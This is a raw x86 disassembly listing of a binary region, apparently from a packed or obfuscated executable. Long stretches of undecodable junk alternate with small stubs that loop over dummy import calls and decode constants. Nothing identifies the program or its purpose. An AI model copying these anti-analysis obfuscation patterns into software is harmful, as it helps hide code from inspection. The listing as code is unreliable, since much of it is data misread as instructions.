  4082e0:	retf   0xc9fc
  4082e3:	mov    al,0x8f
  4082e5:	and    ebx,ebp
  4082e7:	xlat   BYTE PTR ds:[ebx]
  4082e8:	pop    eax
  4082e9:	xor    eax,DWORD PTR [ecx+0x2a96486c]
  4082ef:	dec    edi
  4082f0:	sub    esp,esi
  4082f2:	call   0xb8609029
  4082f7:	loopne 0x408376
  4082f9:	mov    esp,0x74aad96a
  4082fe:	lahf   
  4082ff:	ins    DWORD PTR es:[edi],dx
  408300:	popa   
  408301:	(bad)  
  408302:	xor    DWORD PTR [edx+0x14],ebp
  408305:	ret    
  408306:	cmp    edx,DWORD PTR [edi+0x31c1e104]
  40830c:	xchg   edi,eax
  40830d:	icebp  
  40830e:	mov    ds:0x40d64c,eax
  408313:	mov    eax,DWORD PTR [ebp+0x8]
  408316:	mov    eax,DWORD PTR [eax]
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ebx+esi*4+0x61baef00],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408399
  40840c:	push   es
  40840d:	gs imul eax,edi,0x10
  408411:	js     0x408399
  408413:	hlt    
  408414:	xchg   ecx,eax
  408415:	mov    bl,0x3c
  408417:	cmp    al,0x95
  408419:	cmp    al,0xcf
  40841b:	loope  0x4083e1
  40841d:	inc    esp
  40841e:	dec    ebp
  40841f:	mov    al,ds:0xbc60d963
  408424:	ror    DWORD PTR [edi-0x13],cl
  408427:	adc    ebp,DWORD PTR ds:0x8f937671
  40842d:	mov    ds:0x54213b89,al
  408432:	dec    esi
  408433:	xor    BYTE PTR [ecx-0x35f5f138],0xe0
  40843a:	jns    0x4083d7
  40843c:	cmp    eax,0x703322af
  408441:	test   bl,dh
  408443:	pusha  
  408444:	jae    0x40848d
  408446:	mov    esp,DWORD PTR ds:0x10487e89
  40844c:	xor    eax,0xcf291015
  408451:	or     cl,0x3f
  408454:	xor    bl,BYTE PTR ds:0xb4f60659
  40845a:	xchg   edi,eax
  40845b:	pop    esp
  40845c:	inc    ebp
  40845d:	cld    
  40845e:	or     DWORD PTR [edi+0x69275080],esp
  408464:	xchg   ebp,eax
  408465:	aad    0xd4
  408467:	fidiv  WORD PTR [ebx]
  408469:	adc    ebp,DWORD PTR [edx]
  40846b:	(bad)  
  40846c:	loopne 0x40846f
  40846e:	push   ds
  40846f:	add    ah,BYTE PTR [esi-0x42]
  408472:	jmp    0x8ec2864b
  408477:	mov    DWORD PTR ds:0xa0375cfc,edi
  40847d:	ds sbb eax,0x651ca751
  408483:	or     bh,bh
  408485:	imul   ebp,DWORD PTR [edi+0xe],0xffffff98
  408489:	jg     0x408506
  40848b:	add    dh,bh
  40848d:	or     ebx,edi
  40848f:	adc    BYTE PTR [edi-0x1117b483],cl
  408495:	or     al,0x66
  408497:	push   ds
  408498:	inc    esi
  408499:	push   0x74ad4fc5
  40849e:	inc    esi
  40849f:	ret    
  4084a0:	lds    ecx,FWORD PTR [ebp+0x24d8fd34]
  4084a6:	xchg   DWORD PTR [ecx],ebp
  4084a8:	not    BYTE PTR [ebx+0x1004e21d]
  4084ae:	aad    0x70
  4084b0:	jo     0x40848c
  4084b2:	fisttp DWORD PTR [ecx]
  4084b4:	xlat   BYTE PTR ds:[ebx]
  4084b5:	pop    DWORD PTR [edi+ebx*2]
  4084b8:	push   esi
  4084b9:	adc    DWORD PTR [esp+eiz*4-0x2e7f2cda],ecx
  4084c0:	bound  edi,QWORD PTR [ecx-0x24]
  4084c3:	pop    ss
  4084c4:	test   DWORD PTR [ebx-0x26],ebx
  4084c7:	(bad)  
  4084c8:	test   al,0x35
  4084ca:	mov    edi,ecx
  4084cc:	jno    0x408492
  4084ce:	mov    ebp,0xdb9ee6c6
  4084d3:	adc    BYTE PTR [ebx],ch
  4084d5:	jecxz  0x40847b
  4084d7:	or     al,BYTE PTR [eax+edx*2+0xf1c0e03]
  4084de:	cmp    eax,0x4baa3fd5
  4084e3:	jne    0x408511
  4084e5:	(bad)  [edx+0x108fa163]
  4084eb:	jo     0x4084cd
  4084ed:	xor    esp,ebp
  4084ef:	add    al,0xd7
  4084f1:	fnstenv [ecx]
  4084f3:	test   DWORD PTR [esi+0x4a],eax
  4084f6:	or     ah,BYTE PTR [edi+0x655ffbbb]
  4084fc:	aam    0xd3
  4084fe:	gs retf 0xd808
  408502:	jb     0x4084c0
  408504:	fcomi  st,st(6)
  408506:	pop    ds
  408507:	push   esi
  408508:	jns    0x4084f3
  40850a:	adc    DWORD PTR [ecx-0x1d],0x50
  40850e:	mov    dh,0xbb
  408510:	inc    esi
  408511:	pop    ecx
  408512:	jo     0x40858e
  408514:	cs aad 0xcb
  408517:	xor    ax,WORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0x626a896
  40854d:	ins    DWORD PTR es:[edi],dx
  40854e:	data16 lods al,BYTE PTR ds:[esi]
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x408506
  408559:	mov    ebx,edx
  40855b:	add    esi,DWORD PTR [edi-0x5ee5b5b8]
  408561:	cmp    al,0x1c
  408563:	retf   0xf38c
  408566:	(bad)  
  408568:	mov    al,ds:0xe54565a2
  40856d:	jmp    0x4a33:0xbfff66ae
  408574:	aaa    
  408575:	or     DWORD PTR [eax+0x7671f8d2],ebp
  40857b:	adc    ch,BYTE PTR [ebx-0x19]
  40857e:	mov    dh,0x1b
  408580:	sub    eax,0x4692a7eb
  408585:	and    BYTE PTR [edi-0x31],dl
  408588:	out    0x1a,eax
  40858a:	push   ebp
  40858b:	jg     0x408553
  40858d:	js     0x408574
  40858f:	mov    eax,ds:0xda6b5eda
  408594:	push   es
  408595:	icebp  
  408596:	(bad)  
  408597:	dec    dl
  408599:	fist   DWORD PTR [edi+0x6a00bb16]
  40859f:	stc    
  4085a0:	not    al
  4085a2:	push   ss
  4085a3:	adc    al,0xac
  4085a5:	fiadd  DWORD PTR [ebp+0x5b21834b]
  4085ab:	and    edi,edx
  4085ad:	push   0xa74a5d5f
  4085b2:	xor    ah,BYTE PTR [ebp+ebx*4+0x25]
  4085b6:	add    eax,esi
  4085b8:	cs ret 
  4085ba:	jns    0x408609
  4085bc:	in     al,0x95
  4085be:	xor    cl,BYTE PTR [eax+0x5fe63b68]
  4085c4:	or     esp,DWORD PTR [ebp-0x27d5e55b]
  4085ca:	and    ah,BYTE PTR cs:[ebx+0x38]
  4085ce:	xor    al,BYTE PTR [esi]
  4085d0:	int3   
  4085d1:	xchg   esp,eax
  4085d2:	push   0xffffffd6
  4085d4:	sahf   
  4085d5:	das    
  4085d6:	jb     0x40859d
  4085d8:	test   eax,0x4b4a04c2
  4085dd:	mov    ch,0xb2
  4085df:	shl    esp,0x10
  4085e2:	mov    ds:0x6a0db8f6,al
  4085e7:	xor    eax,ebp
  4085e9:	mov    eax,ebp
  4085eb:	(bad)  
  4085ed:	inc    edx
  4085ee:	dec    eax
  4085ef:	ss pop edi
  4085f1:	jecxz  0x408672
  4085f3:	cld    
  4085f4:	mov    bl,dh
  4085f6:	pusha  
  4085f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f8:	(bad)  [esi+0x5d4a36fe]
  4085fe:	cmc    
  4085ff:	clc    
  408600:	xchg   esp,eax
  408601:	mov    BYTE PTR [edx+0x7734fe2d],ch
  408607:	daa    
  408608:	jp     0x408617
  40860a:	push   esi
  40860b:	xchg   DWORD PTR [edx],edx
  40860d:	icebp  
  40860e:	xor    al,0x6a
  408610:	xchg   ebx,eax
  408611:	xchg   DWORD PTR [ecx+0x6f],edi
  408614:	sub    ah,dl
  408616:	test   al,0x39
  408618:	std    
  408619:	mov    ds:0x88dbf4ed,al
  40861e:	dec    ebx
  40861f:	xor    al,al
  408621:	sub    eax,0xf9201845
  408626:	xor    dh,BYTE PTR [ecx]
  408628:	dec    eax
  408629:	sub    al,0xb2
  40862b:	add    DWORD PTR [edi],eax
  40862d:	outs   dx,BYTE PTR ds:[esi]
  40862e:	push   ss
  40862f:	mov    ch,0x7b
  408631:	cmp    al,0x2
  408633:	mov    ds:0x6e252cd5,eax
  408638:	stos   DWORD PTR es:[edi],eax
  408639:	sahf   
  40863a:	xchg   DWORD PTR [edx-0x81edcba],esi
  408640:	cmc    
  408641:	and    esi,DWORD PTR [edi+0x687e81e6]
  408647:	ror    BYTE PTR [edi+0x5c],cl
  40864a:	mov    esp,0x18892a06
  40864f:	xchg   ebx,eax
  408650:	sti    
  408651:	hlt    
  408652:	sbb    BYTE PTR [ecx-0x7be9f84f],0x18
  408659:	dec    esp
  40865a:	imul   ebp,DWORD PTR [edx],0x78
  40865d:	mov    ebp,DWORD PTR [eax+0x6c]
  408660:	jge    0x408608
  408662:	out    0xbe,al
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fidivr DWORD PTR [esi+eiz*4]
  408742:	je     0x40879f
  408744:	or     DWORD PTR [ebx],ebp
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x408731
  40874d:	push   esi
  40874e:	mov    bl,0xb2
  408750:	scas   eax,DWORD PTR es:[edi]
  408751:	push   ebp
  408752:	sub    DWORD PTR [edi],ecx
  408754:	push   eax
  408755:	jbe    0x4086e1
  408757:	jmp    0x998d1fdb
  40875c:	add    ebx,ecx
  40875e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40875f:	push   esp
  408760:	fmul   st(2),st
  408762:	inc    eax
  408763:	(bad)  [ebx]
  408765:	fst    QWORD PTR [si+0x70cf]
  40876a:	mov    edx,0x1b527d1e
  40876f:	mov    bl,0xcb
  408771:	call   0xbedd5f1f
  408776:	mov    ebp,0x8c2b3a48
  40877b:	mov    BYTE PTR [ecx-0x39],dl
  40877e:	mov    dl,0x55
  408780:	fcomp  DWORD PTR [esi]
  408782:	cmp    cl,BYTE PTR [ebx-0x67]
  408785:	retf   
  408786:	ins    BYTE PTR es:[edi],dx
  408787:	outs   dx,DWORD PTR ds:[esi]
  408788:	xor    ch,BYTE PTR [edx-0x72]
  40878b:	and    eax,0xf0ba49f7
  408790:	and    esi,DWORD PTR [ebp-0x7b]
  408793:	jb     0x4087af
  408795:	push   esi
  408796:	mov    ch,0xcc
  408798:	ret    0x913f
  40879b:	(bad)  
  40879c:	dec    esp
  40879d:	pop    ebp
  40879e:	and    esp,DWORD PTR [esi+0x5f]
  4087a1:	scas   eax,DWORD PTR es:[edi]
  4087a2:	adc    eax,DWORD PTR [ecx-0x41]
  4087a5:	data16 cmp BYTE PTR ds:0x4befce53,bh
  4087ac:	scas   al,BYTE PTR es:[edi]
  4087ad:	pop    eax
  4087ae:	xchg   esp,eax
  4087af:	sub    cl,ch
  4087b1:	in     al,0xa5
  4087b3:	fist   WORD PTR [ebp+ecx*1+0xf4fd705]
  4087ba:	(bad)  
  4087bb:	fmul   DWORD PTR [ebx]
  4087bd:	bound  edi,QWORD PTR [ebx+0x6a13c9d4]
  4087c3:	mov    ebx,ds
  4087c5:	xor    al,0x9
  4087c8:	sbb    DWORD PTR [ecx-0x2ff7c255],0xffffffb3
  4087cf:	lods   al,BYTE PTR ds:[esi]
  4087d0:	mov    WORD PTR [esp+ecx*2+0x5333bdd4],cs
  4087d7:	(bad)  
  4087d8:	ins    BYTE PTR es:[edi],dx
  4087d9:	inc    ecx
  4087da:	fld    DWORD PTR [eax+0x19]
  4087dd:	inc    eax
  4087de:	pop    es
  4087df:	xor    DWORD PTR [ecx],ecx
  4087e1:	mov    ds:0x515b2035,al
  4087e6:	shl    cl,0x16
  4087e9:	mov    esi,ebx
  4087eb:	and    bh,BYTE PTR [esi-0x469fc50a]
  4087f1:	push   cs
  4087f2:	add    dh,0x2d
  4087f5:	stos   DWORD PTR es:[edi],eax
  4087f6:	push   ds
  4087f7:	xor    edi,0xa8355e72
  4087fd:	hlt    
  4087fe:	in     eax,dx
  4087ff:	faddp  st(2),st
  408801:	lods   eax,DWORD PTR ds:[esi]
  408802:	xchg   BYTE PTR [edi],dh
  408804:	mov    al,0x3
  408806:	jnp    0x408854
  408808:	int3   
  408809:	sub    bl,BYTE PTR [edx]
  40880b:	ins    BYTE PTR es:[edi],dx
  40880c:	test   al,0xe8
  40880e:	jae    0x408834
  408810:	push   cs
  408811:	call   0x2a4d07b
  408816:	inc    eax
  408817:	xchg   ecx,eax
  408818:	lea    eax,[esi+ebp*1-0x32]
  40881c:	call   0xbd4f:0x1af78ac1
  408823:	inc    edx
  408824:	ins    DWORD PTR es:[edi],dx
  408825:	pop    es
  408826:	jno    0x4087f4
  408828:	sbb    eax,0xf792cc5d
  40882d:	das    
  40882e:	into   
  40882f:	fcmovnu st,st(2)
  408832:	and    bl,0x6e
  408835:	call   0x596:0xd9afb474
  40883c:	mov    BYTE PTR [eax+0x29],bh
  40883f:	mov    cl,0x41
  408841:	fldenv [ebx+0x3a]
  408844:	jb     0x40882c
  408846:	or     ch,BYTE PTR [edi+ecx*8]
  408849:	pop    edx
  40884a:	enter  0xc804,0xee
  40884e:	test   esp,ecx
  408850:	int3   
  408851:	jge    0x4088b5
  408853:	mov    dh,0x4e
  408855:	data16 out 0x73,al
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x75d74167],edx
  408951:	sbb    edi,ebx
  408953:	jecxz  0x40895a
  408955:	sub    BYTE PTR [esi+0x7e],bh
  408958:	or     bh,BYTE PTR [edi+0x7e]
  40895b:	jle    0x408991
  40895d:	(bad)  
  40895e:	and    al,0x37
  408960:	add    DWORD PTR [edx+edx*2-0x2b7200d7],eax
  408967:	test   DWORD PTR [ebp+ebp*1-0x2183c13d],edi
  40896e:	fisubr WORD PTR [edi-0x19]
  408971:	inc    ebx
  408972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408973:	ds aad 0x29
  408976:	rol    BYTE PTR [ebx],cl
  408978:	dec    edx
  408979:	outs   dx,BYTE PTR ds:[esi]
  40897a:	sti    
  40897b:	fild   QWORD PTR [esi-0xe]
  40897e:	out    dx,eax
  40897f:	stos   DWORD PTR es:[edi],eax
  408980:	xchg   edi,eax
  408981:	jo     0x40896e
  408983:	stos   BYTE PTR es:[edi],al
  408984:	adc    eax,0x1af541a6
  408989:	dec    eax
  40898a:	mov    edx,0xadc0383
  40898f:	adc    BYTE PTR [edx-0x76],0x6
  408993:	retf   0xfdfa
  408996:	ja     0x408937
  408998:	dec    ebx
  408999:	and    BYTE PTR [ecx-0x4f89549f],dl
  40899f:	mov    bl,0xde
  4089a1:	loop   0x408a01
  4089a3:	mov    bl,0xd2
  4089a5:	jno    0x4089b3
  4089a7:	mov    bh,0x3a
  4089a9:	jmp    0xef1d8c3c
  4089ae:	dec    esp
  4089af:	pop    ebx
  4089b0:	xchg   ebx,eax
  4089b1:	pop    ebp
  4089b2:	lahf   
  4089b3:	mov    edi,0x68169aa7
  4089b8:	cmp    eax,0x35a7f280
  4089bd:	cld    
  4089be:	cmp    al,0x22
  4089c0:	push   0xffffff87
  4089c2:	jne    0x4089a6
  4089c4:	cs pusha 
  4089c6:	dec    ebx
  4089c7:	sbb    esp,esi
  4089c9:	in     eax,0xad
  4089cb:	xchg   esi,eax
  4089cc:	inc    ecx
  4089cd:	or     al,0x2
  4089cf:	repnz dec ecx
  4089d1:	xor    DWORD PTR [ecx],esi
  4089d3:	cmp    dh,ah
  4089d5:	popa   
  4089d6:	(bad)  
  4089d8:	sbb    BYTE PTR [eax+0x79],dh
  4089db:	mov    al,0x23
  4089dd:	mov    dh,0x15
  4089df:	inc    esi
  4089e0:	mov    dh,0x7c
  4089e2:	lods   eax,DWORD PTR ds:[esi]
  4089e3:	xor    eax,DWORD PTR [ecx]
  4089e5:	add    al,0x59
  4089e7:	adc    eax,0xf6ae6a1f
  4089ec:	and    al,0x1
  4089ee:	and    DWORD PTR [ebx-0x7b],ebp
  4089f1:	inc    esi
  4089f2:	cmp    al,0xe7
  4089f4:	mov    ch,0x19
  4089f6:	inc    ebp
  4089f7:	mov    eax,ds:0xba6a8330
  4089fc:	xchg   ebp,eax
  4089fd:	and    BYTE PTR [esi+ecx*8+0x3016c419],bl
  408a04:	xor    eax,0x85bf487
  408a09:	(bad)  
  408a0b:	inc    edx
  408a0c:	xlat   BYTE PTR ds:[ebx]
  408a0d:	les    edx,FWORD PTR [edx]
  408a0f:	mov    esi,0xaf3919a1
  408a14:	mov    bh,0xdf
  408a16:	(bad)  
  408a18:	je     0x4089a0
  408a1a:	lock call 0x7274:0x2bb4deb6
  408a22:	pop    edi
  408a23:	das    
  408a24:	sahf   
  408a25:	mov    ah,0x87
  408a27:	jns    0x4089d5
  408a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a2a:	jbe    0x408a64
  408a2c:	cmp    al,0xd3
  408a2e:	fyl2x  
  408a30:	mov    eax,ds:0x1d052a1a
  408a35:	jne    0x408a20
  408a37:	sub    ecx,DWORD PTR [eax]
  408a39:	add    BYTE PTR [ebp+0x36],bh
  408a3c:	dec    esp
  408a3d:	dec    ebx
  408a3e:	push   esp
  408a3f:	(bad)  
  408a40:	retf   0xe454
  408a43:	ror    BYTE PTR [eax-0x63],cl
  408a46:	in     al,dx
  408a47:	pop    ecx
  408a48:	out    dx,al
  408a49:	xchg   esp,eax
  408a4a:	pusha  
  408a4b:	fisubr DWORD PTR [ebp+0x62ec5145]
  408a51:	out    0x81,al
  408a53:	bound  ebp,QWORD PTR [eax+ebx*2]
  408a56:	rcr    DWORD PTR ds:0x9458181,0xa9
  408a5d:	cmp    ah,bl
  408a5f:	shl    dh,cl
  408a61:	call   0x7be1292c
  408a66:	push   cs
  408a67:	pop    esp
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	fcmovnu st,st(5)
  408a87:	call   DWORD PTR [edx+0x7e7e2911]
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408aaf
  408a92:	sub    bh,BYTE PTR [eax+0x55]
  408a95:	into   
  408a96:	jne    0x408a52
  408a98:	int3   
  408a99:	out    0x22,al
  408a9b:	mov    cs,WORD PTR [edx-0x6ad99f31]
  408aa1:	mov    bh,0x46
  408aa3:	cmp    eax,0x95573705
  408aa8:	mov    esp,0x8f1b0da0
  408aad:	xchg   BYTE PTR [ebx],dl
  408aaf:	push   edx
  408ab0:	imul   ebp,DWORD PTR [esi-0x26e67f74],0xffffff8a
  408ab7:	test   BYTE PTR [eax-0x58],ch
  408aba:	idiv   ah
  408abc:	push   edx
  408abd:	jne    0x408aaf
  408abf:	aaa    
  408ac0:	pop    esi
  408ac1:	outs   dx,DWORD PTR ds:[esi]
  408ac2:	jnp    0x408ac4
  408ac4:	dec    BYTE PTR [ecx+0x5bae29ba]
  408aca:	das    
  408acb:	test   WORD PTR [edi-0x1c5fa9a0],bp
  408ad2:	ror    DWORD PTR [ebx-0x6bba2651],cl
  408ad8:	sub    eax,0x845c737c
  408add:	push   ebx
  408ade:	hlt    
  408adf:	stos   DWORD PTR es:[edi],eax
  408ae0:	sbb    bl,BYTE PTR [eax+0x4b65c98f]
  408ae6:	loope  0x408ae0
  408ae8:	fwait
  408ae9:	in     eax,0xaf
  408aeb:	or     al,0x7
  408aed:	loop   0x408ad9
  408aef:	(bad)  
  408af0:	push   eax
  408af1:	sub    BYTE PTR [ecx+0x69414737],al
  408af7:	sub    cl,dh
  408af9:	add    DWORD PTR [esi-0x6f48bd1c],edi
  408aff:	int3   
  408b00:	fiadd  WORD PTR [ecx+0x3d]
  408b03:	fwait
  408b04:	xchg   ebp,eax
  408b05:	sti    
  408b06:	pop    ebp
  408b07:	stos   DWORD PTR es:[edi],eax
  408b08:	mov    al,ds:0x3cade3d4
  408b0d:	(bad)  
  408b0e:	dec    edx
  408b0f:	mov    ah,BYTE PTR [ecx-0x7da686ce]
  408b15:	das    
  408b16:	pop    ss
  408b17:	mov    dl,0x26
  408b19:	mov    dl,0x26
  408b1b:	outs   dx,BYTE PTR ds:[esi]
  408b1c:	inc    DWORD PTR [ecx+0x1cf9767e]
  408b22:	pop    ds
  408b23:	popf   
  408b24:	dec    eax
  408b25:	pop    ebp
  408b26:	(bad)  
  408b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b28:	mov    dl,0x2a
  408b2a:	and    BYTE PTR [ebp+0x60],cl
  408b2d:	push   es
  408b2e:	rol    ebx,0xf0
  408b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b32:	scas   al,BYTE PTR es:[edi]
  408b33:	ds shr ebx,cl
  408b36:	lock sar ah,cl
  408b39:	cld    
  408b3a:	mov    ch,0xe3
  408b3c:	sub    bl,0x6d
  408b3f:	inc    edx
  408b40:	loopne 0x408b6b
  408b42:	push   ecx
  408b43:	rcr    BYTE PTR [eax+0x2105d55e],1
  408b49:	fs (bad) 
  408b4b:	adc    edx,DWORD PTR [ecx+0x20a8bccd]
  408b51:	mov    dh,0x64
  408b53:	out    dx,al
  408b54:	dec    cx
  408b56:	dec    edx
  408b57:	repnz pop esi
  408b59:	in     eax,dx
  408b5a:	mov    ds:0xa4f570b1,al
  408b60:	lock jnp 0x408b18
  408b63:	mov    edx,0x370b6416
  408b68:	jle    0x408b39
  408b6a:	ins    DWORD PTR es:[edi],dx
  408b6b:	outs   dx,DWORD PTR ds:[esi]
  408b6c:	xlat   BYTE PTR ds:[ebx]
  408b6d:	int3   
  408b6e:	inc    esp
  408b6f:	pop    esp
  408b70:	jg     0x408b41
  408b72:	cdq    
  408b73:	and    eax,0x71fd4c45
  408b78:	jmp    0xb279f84e
  408b7d:	sub    al,0x11
  408b7f:	jns    0x408b3e
  408b81:	cld    
  408b82:	pushf  
  408b83:	scas   al,BYTE PTR es:[edi]
  408b84:	and    DWORD PTR [ecx+0x74],ebx
  408b87:	and    eax,0xf8dc3a1a
  408b8c:	pop    es
  408b8d:	push   esp
  408b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b8f:	mov    eax,0x82a6f6ab
  408b94:	ins    BYTE PTR es:[edi],dx
  408b95:	mov    eax,0xa9eea32b
  408b9a:	icebp  
  408b9b:	outs   dx,BYTE PTR ds:[esi]
  408b9c:	adc    BYTE PTR [ebx+0x57],0x8b
  408ba0:	jge    0x408baa
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
